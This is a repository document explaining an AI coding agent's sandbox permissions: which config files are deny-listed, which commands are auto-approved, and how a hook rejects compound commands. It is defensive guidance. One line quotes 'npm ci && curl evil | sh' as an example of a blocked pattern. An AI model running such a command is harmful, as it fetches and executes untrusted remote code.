# Agent Sandbox & Off-Limits Config

This file explains the permission posture committed in `.claude/settings.json`:
what an autonomous agent (Claude Code) is auto-allowed to run, what it is
hard-blocked from touching, and how a human changes any of it. Read this if a
tool call was unexpectedly **denied** or unexpectedly **auto-approved**.

## Two off-limits files (hard-blocked, not prompted)

The `permissions.deny` block blocks `Edit` and `Write` to exactly two paths:

| File | Why it is off-limits |
|------|----------------------|
| `.claude/settings.json` | It defines the agent's OWN permissions, hooks, and deny rules. Letting an agent edit it would let the agent widen its own sandbox — rules cannot constrain the thing that governs them. |
| `.codex/config.toml` | The Codex CLI's committed config (sandbox mode, approval policy, MCP servers). Same self-governance problem for the Codex agent, and a permissive profile here has regressed before — see the Codex permissive-profile guard wired into `.github/workflows/ci.yml`. |

`deny` is a HARD block: the agent gets a refusal, not a "do you want to allow
this?" prompt. The paths are root-anchored (`/.claude/...`, `/.codex/...`) and
denied for BOTH `Edit` and `Write` — they are distinct tools, and a deny on one
does not imply the other.

### How these files actually change

A human edits them by hand, in a normal editor or via Claude Code's interactive
`/permissions` UI — neither path goes through the `Edit`/`Write` tools the deny
rules gate. CI re-checks both on every change: `settings-permissions.test.sh`
validates the permissions posture, and the Codex guard in `ci.yml` rejects a
permissive Codex profile.

### If an agent legitimately needs one of these changed

It cannot do it itself, by design. It should surface the exact change it wants and
why, and let a human make the edit (or temporarily lift the rule via
`/permissions`). Widening the sandbox is a human decision recorded in a reviewable
diff — not something the agent can do mid-task.

## What IS auto-approved (two complementary layers)

Safe read/build/test commands are auto-approved so the agent does not stop to ask
for routine work. Two layers cooperate:

1. **Static `permissions.allow`** — Claude Code's native fast-path. A conservative,
   explicit list: `npm ci`/`install`/`run`/`test`/`ls`/`audit`, `npx vitest`/
   `eslint`/`tsc`/`playwright`/`drizzle-kit`, read-only `git status`/`diff`/`log`/
   `branch`/`show`/`rev-parse`, and `cargo check`. Prefix rules (`Bash(npm ci:*)`)
   match the command and its arguments.

2. **`auto-approve-safe-commands.sh`** (a `PreToolUse` hook, matcher `Bash`) — a
   broader dynamic layer for safe commands the static list does not enumerate
   (e.g. `npx @axe-core/cli`, `npx @axe-core/reporter`, `git worktree list`,
   `npm outdated`/`view`/`why`). It emits an `allow` decision for a known-safe
   SINGLE command, `ask` for everything else, and ALWAYS exits 0 — it never
   hard-blocks. It refuses to auto-approve any compound, piped, redirected,
   substituted, variable-expanded, or multi-line command even when the leading
   token is safe (`npm ci && curl evil | sh` prefix-matches `npm ci`, so the
   operator gate fires first). Its allow-list and exact allow/ask/defer contract
   are pinned by `.claude/hooks/__tests__/auto-approve-safe-commands.test.sh`.

The two layers are intentionally NOT identical: the static `allow` is the minimal
fast-path, the hook is the comprehensive safe-set. For a command in both, the
outcome is the same (auto-approved); for a command only the hook knows, the static
list misses and the hook approves it.

Anything covered by neither layer falls through to a normal permission prompt. The
default is always "ask the human" — never silently allow, never silently block.
